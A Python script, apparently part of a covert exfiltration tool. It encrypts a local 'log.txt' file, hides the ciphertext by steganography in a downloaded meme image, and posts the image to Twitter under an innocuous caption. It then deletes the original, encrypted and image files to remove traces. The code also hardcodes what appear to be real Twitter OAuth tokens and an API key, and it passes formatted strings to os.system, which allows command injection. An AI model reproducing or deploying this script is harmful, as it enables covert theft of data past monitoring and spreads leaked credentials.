import os
import subprocess
import sys
import json
import random
from io import BytesIO

try:
    import pip
except ImportError:
    os.system('sudo apt install python3-venv python3-pip')

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import tweepy
except ImportError:
    install("tweepy")
    import tweepy

try:
    from stegano import lsb
except ImportError:
    install("Stegano")
    from stegano import lsb

try:
    import PIL
except ImportError:
    install("Pillow")
    import PIL

try:
    import requests
except ImportError:
    install("requests")
    import requests

try:
    import tweepy
except ImportError:
    install("tweepy")
    import tweepy


def getConfig():
    #TODO get information from configuration file
    pass

def updateConfig():
    #TODO update configuration file
    pass

def DownloadTrendingImages():
    API_KEY = "c4b739c3-442e-49c2-ac44-f5ad6b0e37e3"
    headers = {'Content-Type': 'application/json'}
    api_url = "http://version1.api.memegenerator.net//Generators_Select_ByTrending?apiKey=" + API_KEY    
    response = requests.get(api_url, headers=headers)

    if response.status_code == 200:
        content = json.loads(response.content.decode('utf-8'))
        return content["result"]
    else:
        return None

def getImage():
    ImageSize = "600x600" 
    ImageSet = DownloadTrendingImages()
    ImageSet_Size = len(ImageSet)

    #get one image
    if ImageSet_Size >= 1:
        Image = random.choice(ImageSet)
    else:
        #No image not returned
        Image = None

    #image url
    url = Image["imageUrl"]
    index_of_last_slash = url.rfind("/")
    url = url[:index_of_last_slash+1] + ImageSize + "/" + url[index_of_last_slash+1:]

    response = requests.get(url)
    if response.status_code == 200:
        content = response.content
        #return JPEG file
        return PIL.Image.open(BytesIO(content))
    else:
        return None


#hide message into image
def stenographizeImage(ImagePath,NewImagePath,Text):
    secret_image = lsb.hide(ImagePath,message=Text)
    secret_image.save(NewImagePath)

#reveal hidden message from image
def deStenographizeImage(ImagePath):
    revealedMessage = lsb.reveal(ImagePath)
    #remove b'' strings from message
    revealedMessage = revealedMessage[2:len(revealedMessage)-1]
    return revealedMessage

def encrypt(password, logged_file, encrypted_file):
    enc_scheme = "-aes-128-cbc"
    opts = "-a -A -nosalt"
    openssl_cmd = 'openssl enc -pass pass:{} {} {} -in {} -out {} -nosalt 2> /dev/null '.format(password, enc_scheme, opts, logged_file, encrypted_file)

    try:
        os.system(openssl_cmd)
    except Exception as e:
        print(e)

def decrypt(password, encrypted_file, logged_file):
    enc_scheme = "-aes-128-cbc"
    opts = "-d -a -A -nosalt"
    openssl_cmd = 'openssl enc -pass pass:{} {} {} -in {} -out {} -nosalt 2> /dev/null '.format(password, enc_scheme, opts, encrypted_file, logged_file)

    try:
        os.system(openssl_cmd)
    except Exception as e:
        print(e)

def cleanup(files):
    for eaFile in files:
        if os.path.exists(eaFile):
            os.remove(eaFile)

# tweet image
def tweetSetup():
    consumer_key = '94lE6CQUO1NcpfGUjbY7a2D32'
    consumer_key_secret = 'BSkoyZTEIm3oMIPvLWSOcCqnFd0w9n1WagP0SY43ztGxI8cOlz'
    access_token = '1265315199197736960-WCposgyu6MQ3y1hlAJj8enfRbwyLBI'
    access_token_secret = 'oJ9K73Fw3E5GZiAB9ftqvlGsopbexqi2n2OoYISxjqfdA'

    auth = tweepy.OAuthHandler(consumer_key, consumer_key_secret)
    auth.set_access_token(access_token, access_token_secret)
    return tweepy.API(auth)

def tweetImage(tw_api, image_path, tw_text="I love lemons"):
    im_handler = tw_api.media_upload(image_path)
    media_ids = [im_handler.media_id_string]
    status = tw_api.update_status(tw_text, media_ids=media_ids)

def main():

    """
    Image size of 600x600 = 360,000 pixels
    Each byte of ASCII character can be encoded into 3 pixels
    Bytes of ascii = 360,000 / 3 = 120,000 bytes
    120,000 bytes = 117kB of text into image

    Gets image from meme generator

    """
    image_name = "test_image"
    ImagePath = "./" + image_name + ".png"
    NewImagePath = "./" + image_name + "_new" + ".png"

    JPEG_IMG = getImage()
    JPEG_IMG.save(ImagePath)
    PNG_IMAGE = PIL.Image.open(ImagePath)
    width, height = PNG_IMAGE.size
    image_text_storage = (width * height)//3 #number of ASCII character that is storable

    logged_file = "log.txt"
    encrypted_file = "encrypted.txt"
    password = "password"

    encrypt(password, logged_file, encrypted_file)

    with open(encrypted_file,'rb') as encrypted_text:
        message = str(encrypted_text.read())
        if image_text_storage <= len(message):
            # TODO msg too large. 
            # Can consider sending multiple tweets or multiple images in one tweet
            pass
        else:
            stenographizeImage(ImagePath,NewImagePath,message)
            tw_api = tweetSetup()
            tweetImage(tw_api, NewImagePath)

    files = [ImagePath, NewImagePath, logged_file, encrypted_file]
    cleanup(files)

main()
